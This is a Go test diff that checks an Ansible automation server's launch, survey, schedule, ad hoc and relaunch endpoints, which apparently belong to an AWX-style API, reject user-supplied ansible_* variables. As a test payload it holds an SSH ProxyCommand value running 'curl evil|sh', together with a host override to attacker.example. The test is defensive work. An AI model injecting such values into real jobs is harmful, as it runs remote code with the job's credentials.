@@ -494,3 +494,68 @@ func TestLaunchRefusesUnpromptedFields(t *testing.T) {
 	}
 	must(t, a.post(fmt.Sprintf("workflow_job_templates/%d/launch/", wf), map[string]any{"limit": "h1"}), 201)
 }
+
+// ansible_* variables control how Ansible connects and runs (a ProxyCommand
+// in ansible_ssh_common_args runs where the job connects from, with its
+// credentials), and extra variables override everything. Whoever launches
+// may not set them on any path; the template's own variables may.
+func TestLaunchRefusesAnsibleVars(t *testing.T) {
+	f := newLaunchFixture(t)
+	a := f.a
+	evil := map[string]any{"ansible_ssh_common_args": "-o ProxyCommand='sh -c \"curl evil|sh\"'"}
+	refused := func(r resp, field string) {
+		t.Helper()
+		if r.Status != 400 || !strings.Contains(r.Raw, field) || !strings.Contains(r.Raw, "ansible_") {
+			t.Fatalf("want 400 on %s naming the variable, got %d: %s", field, r.Status, r.Raw)
+		}
+	}
+	jt := f.template(t, "site.yml", map[string]any{"ask_variables_on_launch": true})
+	jobsOf := func(id int64) float64 {
+		return must(t, a.get(fmt.Sprintf("job_templates/%d/jobs/", id)), 200).Body["count"].(float64)
+	}
+
+	// Job and workflow template launches, in any letter case.
+	refused(a.post(fmt.Sprintf("job_templates/%d/launch/", jt), map[string]any{"extra_vars": evil}), "extra_vars")
+	refused(a.post(fmt.Sprintf("job_templates/%d/launch/", jt), map[string]any{"extra_vars": "ANSIBLE_HOST: attacker.example"}), "extra_vars")
+	if n := jobsOf(jt); n != 0 {
+		t.Fatalf("a refused launch created %v jobs", n)
+	}
+	must(t, a.post(fmt.Sprintf("job_templates/%d/launch/", jt), map[string]any{"extra_vars": map[string]any{"app": "web"}}), 201)
+	wf := must(t, a.post("workflow_job_templates/", map[string]any{"name": uniq("wf"), "organization": f.org, "ask_variables_on_launch": true}), 201).id()
+	refused(a.post(fmt.Sprintf("workflow_job_templates/%d/launch/", wf), map[string]any{"extra_vars": map[string]any{"ansible_connection": "local"}}), "extra_vars")
+
+	// Survey questions on ansible_* variables.
+	spec := map[string]any{"name": "s", "description": "", "spec": []any{map[string]any{
+		"question_name": "Jump host", "variable": "ansible_ssh_common_args", "type": "text", "required": false}}}
+	r := a.post(fmt.Sprintf("job_templates/%d/survey_spec/", jt), spec)
+	if r.Status != 400 || !strings.Contains(r.Raw, "ansible_ssh_common_args") {
+		t.Fatalf("survey: %d %s", r.Status, r.Raw)
+	}
+
+	// Schedules and ad hoc commands.
+	refused(a.post(fmt.Sprintf("job_templates/%d/schedules/", jt), map[string]any{"name": uniq("s"),
+		"rrule": "DTSTART:20300101T000000Z RRULE:FREQ=DAILY", "extra_data": evil}), "extra_data")
+	refused(a.post("ad_hoc_commands/", map[string]any{"inventory": f.inv, "module_name": "ping", "extra_vars": "ansible_connection: local"}), "extra_vars")
+
+	// Relaunch replays the original job; its body only brings passwords.
+	plain := f.template(t, "site.yml", nil)
+	first := must(t, a.post(fmt.Sprintf("job_templates/%d/launch/", plain), map[string]any{}), 201).id()
+	again := must(t, a.post(fmt.Sprintf("jobs/%d/relaunch/", first), map[string]any{"extra_vars": evil, "limit": "h1"}), 201).id()
+	job := must(t, a.get(fmt.Sprintf("jobs/%d/", again)), 200)
+	if strings.Contains(fmt.Sprint(job.Body["extra_vars"]), "ansible_") || job.Body["limit"] != "" {
+		t.Fatalf("relaunch took fields from its body: extra_vars=%v limit=%v", job.Body["extra_vars"], job.Body["limit"])
+	}
+
+	// The template's own ansible_* variables are its editors' choice.
+	own := f.template(t, "site.yml", map[string]any{"extra_vars": "ansible_python_interpreter: /usr/bin/python3"})
+	ownJob := must(t, a.post(fmt.Sprintf("job_templates/%d/launch/", own), map[string]any{}), 201).id()
+	must(t, a.post(fmt.Sprintf("jobs/%d/relaunch/", ownJob), map[string]any{}), 201)
+
+	// AWX's behaviour on request; a job launched that way is not replayed once it is off.
+	must(t, a.patch("settings/jobs/", map[string]any{"ALLOW_ANSIBLE_VARS_AT_LAUNCH": true}), 200)
+	t.Cleanup(func() { a.patch("settings/jobs/", map[string]any{"ALLOW_ANSIBLE_VARS_AT_LAUNCH": false}) })
+	allowed := must(t, a.post(fmt.Sprintf("job_templates/%d/launch/", jt), map[string]any{"extra_vars": evil}), 201).id()
+	must(t, a.post(fmt.Sprintf("job_templates/%d/survey_spec/", jt), spec), 200)
+	must(t, a.patch("settings/jobs/", map[string]any{"ALLOW_ANSIBLE_VARS_AT_LAUNCH": false}), 200)
+	refused(a.post(fmt.Sprintf("jobs/%d/relaunch/", allowed), map[string]any{}), "extra_vars")
+}
